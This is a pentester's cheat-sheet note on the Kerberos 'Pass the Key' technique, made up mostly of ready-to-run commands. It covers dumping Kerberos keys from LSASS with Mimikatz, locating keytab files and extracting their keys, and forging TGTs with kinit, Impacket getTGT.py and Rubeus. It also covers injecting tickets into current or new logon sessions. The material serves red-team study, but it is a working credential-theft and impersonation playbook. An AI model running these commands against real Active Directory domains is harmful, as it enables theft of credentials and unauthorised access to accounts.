---
Primary_category: "[[KERBEROS]]"
title: PASS THE KEY
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses: 
---

###### PRIMARY CATEGORY → [[KERBEROS]]

#### *Theory*

> ***[Reference](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#example-credential-extraction)***

We can Forge our own **Kerberos Tickets**, without the need to harvesting them, using both ***[[OVERPASS THE HASH|OverPass the Hash]]*** or ***[[PASS THE KEY|Pass the Key]]*** Techniques

These approaches convert the following **hashes/keys** for a domain joined user into a full **Ticket Granting Ticket (TGT)**

- ***RC4_HMAC (NTLM Hash)***
- ***AES128_CTS_HMAC_SHA1***
- ***AES256_CTS_HMAC_SHA1***

In this case, the ***Pass the Key*** technique can makes use of all ***Kerberos Keys*** with the exception of the ***NTLM Hash (RC4-HMAC)***, which is used in the ***[[OVERPASS THE HASH|OverPass the Hash]]*** technique

---

#### *Harvesting Kerberos eKeys from LSASS.exe*

To forge the ***Kerberos Tickets***, the user's hashes are needed, at least one of them

These ***hashes/keys*** can be dumped as follows →

##### *Mimikatz*

> ***[Mimikatz](https://github.com/ParrotSec/mimikatz)***

> ***Privileges needed since the `sekurlsa` module is used***

```bash
mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::ekeys' exit
```

---

#### *Searching for Keytab Files*

##### *Find*

```bash
find / -regextype posix-extended -regex '.+\.(kt|keytab)$' -type f -ls 2> /dev/null
```

---

#### *Kerberos EKeys Extraction from a Keytab*

##### *KeyTabExtract.py*

> ***[KeyTabExtract.py](https://github.com/sosdave/KeyTabExtract)***

```bash
python3 keytabextract.py <KEYTAB_FILE[]()>
```

The output of the ***[[#KeyTabExtract.py]]*** tool could be parsed as follows to only extract the ***Ekeys***

```bash
python3 keytabextract.py <KEYTAB_FILE> | awk -F: '/HASH : / { print $2}' | tr -d ' ' > <KPRINCIPAL>.ekeys
```
---

#### *Passing the Key with KRB5-USER*

##### *Setup*

```bash
apt install -y -- krb5user
```

Once we have ***Read Privileges*** on a ***KeyTab*** file, we could use one of the ***Kerberos Keys*** stored in that file to encrypt a generated ***Timestamp*** and send it as an ***AS_REQ*** packet to the ***Authentication Service (AS)*** of the ***Key Distribuction Center (KDC)***

There are tools that carry out the above process, such as **`kinit`**

##### *Identifying the Kerberos Principal of a Keytab*

First, for a given ***KeyTab*** file, we should know with which ***Kerberos Principal*** are related the ***Kerberos Keys*** stored within this file

We can perform this task using `klist`

```bash
klist -k -t <KEYTAB_FILE>
```

##### *TGT Request (AS_REQ) using a Keytab*

###### *Kinit*

```bash
kinit -k -t <KEYTAB_FILE> <KPRINCIPAL>
```

> [!DANGER]- *e.g.*
>
> ```bash
> kinit -k -t ./test.keytab test@TEST.LOCAL
> ```
>

After that, a ***CCache*** file should be generated, usually in the `/tmp` directory

Note that, the requested ***TGT*** is injected directly into the current session

To list the information related to the ***Credential Cache*** file containing the requested ***TGT*** proceed as follows

```bash
klist # Or klist -c <CCACHE_FILE>
```

---

#### *Passing the Key - Without Injecting TGT*

##### *GetTGT.py - Impacket*

> ***[GetTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)***

It generates a ***CCache*** file from a provided ***NT Hash ([[OVERPASS THE HASH|OverPass the Hash]])*** or a ***Kerberos Key (Pass the Key)***

```bash
GetTGT.py -dc-ip <DC> -aesKey <KEY> '<DOMAIN>/<USER>:<PASSWD>@<KDC>'
```

Once a ***TGT*** is obtained, just use the ***KRB5CCNAME*** env parameter to inject the ***TGT*** into the session, as indicated [[PASS THE TICKET#Ticket Injection - Linux#KRB5CCNAME|here]], and be able to use tools that implement ***[[PASS THE TICKET|Pass the Ticket]]***

##### *Rubeus*

> ***[Rubeus](https://github.com/GhostPack/Rubeus)***

> ***[Reference](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#asktgt)***

###### *AES128_HMAC*

> ***Same workflow as [[OVERPASS THE HASH#OverPassing The Hash#Rubeus|here]]***

```bash
rubeus.exe asktgt /user:<USERNAME> /aes128:<AES128_KEY> /nowrap
```

###### *AES256_HMAC*

> ***Same workflow as [[OVERPASS THE HASH#OverPassing The Hash#Rubeus|here]]***

```bash
rubeus.exe asktgt /user:<USERNAME> /aes256:<AES256_KEY> /nowrap
```

---

#### *Passing the Key - Injecting TGT*

##### *Mimikatz*

> ***[Mimikatz](https://github.com/ParrotSec/mimikatz)***

> ***[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)***

###### *AES128_HMAC*

> ***Same workflow as [[OVERPASS THE HASH#OverPassing The Hash#Mimikatz|here]]***

```bash
mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::pth /user:<USER> /domain:<DOMAIN_OR_WORKGROUP> /aes128:<AES_KEY> /run:<COMMAND>'
```

###### *AES256_HMAC*

> ***Same workflow as [[OVERPASS THE HASH#OverPassing The Hash#Mimikatz|here]]***

```bash
mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::pth /user:<USER> /domain:<DOMAIN_OR_WORKGROUP> /aes256:<AES_KEY> /run:<COMMAND>'
```

##### *Rubeus*

###### *OverPass the Hash | Pass the Key + TGT Injection - Current LUID*

> ***All in One***

> ***Elevated Privileges not needed***

> ***TGT Injected into the Current Logon Session***

It performs ***[[OVERPASS THE HASH#OverPassing The Hash#Rubeus|OverPass the Hash]]*** or ***Pass the Key*** with the provided ***Kerberos Principal (User Account)*** and ***Key/Hash***

The ***Pass the Ticket*** is carried out using the **`/ptt`** parameter

It injects the ***TGT*** contained within the received ***AS_REP*** in the ***Current Logon Session***

```bash
rubeus.exe asktgt /ptt /user:<USERNAME> /[rc4,aes128,aes256]:<HASH_OR_KEY>
```

> [!DANGER]- *Important*
>
> Only ***One TGT*** can be applied at a time to the ***Current Logon Session*** 
>
> So, the previous TGT is ***wipped***
>

###### *OverPass the Hash | Pass the Key + TGT Injection - Another LUID*

> ***TGT Injected into Another Logon Session***

- ***Logon Session Type 9 (NewCredentials) Creation***

***Runas***

```bash
runas.exe /netonly /user:<USERNAME> cmd.exe # Or Powershell.exe
```

***Rubeus***

```bash
rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show # Or Powershell.exe Full Path
```

- ***Ticket Injection into the above Created Logon Session***

***Rubeus with `/luid` parameter***

> ***Elevated Privileges needed***

The ***LUID*** of the ***Logon Session Type 9*** must be specified in order to inject the ***TGT*** into it

```bash
rubeus asktgt /ptt /user:<USERNAME> /[rc4,aes128,aes256]:<HASH_OR_KEY> /luid:<LUID>
```

> [!IMPORTANT]- *Info*
> 
> Injecting a ***TGT*** into the memory space of a specific ***LUID*** involves writing to the ***LSASS.exe*** process
>
> Elevated privileges are required when the process performing the injection is running under an ***Access Token*** which is not associated with the ***Target LUID***
>
> This is because it implies writing to memory regions of ***lsass.exe*** that are not tied to the ***caller's own security context***
>
> On the other hand, elevated privileges are not required when a process injects a ***TGT*** into the memory space of a ***LUID*** that is associated with its own ***Access Token***
>


***Rubeus without `/luid` parameter***

> ***Elevated privileges not needed***

The ***TGT*** injection into ***Created Logon Session Type 9*** is performed from the process (*cmd.exe, powershell.exe...*) whose ***Acces Token*** is associated with that ***LUID***

i.e. From the *cmd.exe* or *powershell.exe* launched

```bash
rubeus asktgt /ptt /user:<USERNAME> /domain:<DOMAIN> /[rc4,aes128,aes256]:<HASH_OR_KEY>
```
